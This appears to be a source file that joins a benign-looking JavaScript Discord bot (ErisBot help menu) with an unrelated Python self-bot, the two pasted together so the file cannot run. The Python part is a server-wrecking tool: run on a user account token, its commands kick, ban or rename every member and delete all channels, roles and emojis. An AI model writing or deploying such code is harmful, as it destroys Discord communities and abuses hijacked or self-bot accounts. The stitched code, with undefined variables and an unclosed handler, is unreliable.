const Discord = require('discord.js');
const bot = new Discord.Client();
const token = process.env.token;
var prefix = (".");

bot.on('ready', () => {
    bot.user.setPresence({ game: { name: 'erisbot.com | .help', type: 0}})
    console.log("Bot pret");
});

    
    bot.on('message', message => {
        if (message.content === "ErisBot"){
            message.reply("Yes ?")
        }
        
        if (message.content === prefix+ "help"){
            var help_embed = new Discord.RichEmbed()
                .setColor('#333333')
                .addField("Help menu !"," If you want more information regarding a specific command, use help command replacing command with the command you want :)")
                .addField("ErisBot is much more stable now after many days of testing. If you continue to find bugs, please let us know with the inviteme command", "Commands :")
                .addField("Fun Commands", "**.music** -  Blissful and clean music features straight to your ears!\n **.fml** - FML, if you think you're having a terrible day, read one of these!\n **.ud** - Search Urban Dictionary!")
                .addField("Utilities Commands", "**.stats** - Interested in the statistics of the bot? This is what you're looking for!\n **.help** - Confused on what commands I have? This'll list them for you!\n **.twitter** - Live twitter feeds straight to your channels!\n **.userinfo** - Get detailed information about a specific user!\n **.serverinfo** - Get detailed information about this server!\n **.ping** - Reply with a pong! Used to test response time!\n **.inviteme** - I'll join your Discord Server!")
                .addField("Customization Commands", "**.ignore** - Don't like Eris responding to something? Make him ignore it!")
                .addField("`Erisbot.com`", "https://www.erisbot.com/")
            message.channel.sendEmbed(help_embed);
        }

import discord
from discord.ext import commands
from discord.ext.commands import Bot

print ("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("Ready to be innocent.")

@bot.command(pass_context=True)
async def kall(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.kick(user)
                print (user.name + " has been kicked from " + ctx.message.server.name)
            except:
                pass    
        print ("Action Completed: kall")

@bot.command(pass_context=True)
async def ball(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.ban(user)
                print (user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass 
        print ("Action Completed: ball")  

@bot.command(pass_context=True)
async def rall(ctx):
    if bot.user.id == ctx.message.author.id:
        for user in list(ctx.message.server.members):
            try:
                await bot.change_nickname(user, rename_to)
                print (user.name + " has been renamed to " + rename_to + " in " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: rall")

@bot.command(pass_context=True)
async def dall(ctx, condition):
    if bot.user.id == ctx.message.author.id:
        if condition.lower() == "channels":
            for channel in list(ctx.message.server.channels):
                try:
                    await bot.delete_channel(channel)
                    print (channel.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.message.server.roles):
                try:
                    await bot.delete_role(ctx.message.server, role)
                    print (role.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.message.server.emojis):
                try:
                    await bot.delete_custom_emoji(emoji)
                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for emoji in list(ctx.message.server.emojis):
                try:
                    await bot.delete_custom_emoji(emoji)
                    print (emoji.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            for channel in list(ctx.message.server.channels):
                try:
                    await bot.delete_channel(channel)
                    print (channel.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            for role in list(ctx.message.server.roles):
                try:
                    await bot.delete_role(ctx.message.server, role)
                    print (role.name + " has been deleted in " + ctx.message.server.name)
                except:
                    pass
            print ("Action Completed: dall all")

@bot.command(pass_context=True)
async def destroy(ctx):
    if bot.user.id == ctx.message.author.id:
        for emoji in list(ctx.message.server.emojis):
            try:
                await bot.delete_custom_emoji(emoji)
                print (emoji.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for channel in list(ctx.message.server.channels):
            try:
                await bot.delete_channel(channel)
                print (channel.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for role in list(ctx.message.server.roles):
            try:
                await bot.delete_role(ctx.message.server, role)
                print (role.name + " has been deleted in " + ctx.message.server.name)
            except:
                pass
        for user in list(ctx.message.server.members):
            try:
                await bot.ban(user)
                print (user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: destroy")

bot.run(token, bot=False)

bot.login(token);
        
